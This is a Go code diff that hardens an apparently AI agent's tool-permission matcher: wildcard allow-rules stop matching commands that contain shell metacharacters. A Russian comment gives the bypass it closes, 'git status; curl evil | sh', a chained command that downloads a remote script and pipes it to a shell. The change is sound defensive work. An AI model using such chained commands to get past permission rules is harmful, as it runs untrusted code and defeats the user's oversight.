@@ -90,7 +90,19 @@ func (r Rule) Match(tool, subject string) bool {
 	if r.Pattern == "" || r.Pattern == "*" {
 		return true
 	}
-	return matchGlob(r.Pattern, subject)
+	if !matchGlob(r.Pattern, subject) {
+		return false
+	}
+	// Разрешение по шаблону не должно раздаваться цепочкам команд:
+	// "bash(git status *)" раньше пропускал "git status; curl evil | sh".
+	// Метасимволы оболочки в предмете выключают allow-шаблон — действие
+	// уйдёт в вопрос. Точное правило продолжает работать, а deny сужать
+	// не нужно: лишний запрет безопаснее лишнего разрешения.
+	if r.Mode == PermAllow && strings.ContainsAny(r.Pattern, "*?[") &&
+		strings.ContainsAny(subject, "!$&();<>`|\n\r") {
+		return false
+	}
+	return true
 }
 
 // matchToolName — совпадение имени инструмента по шаблону.
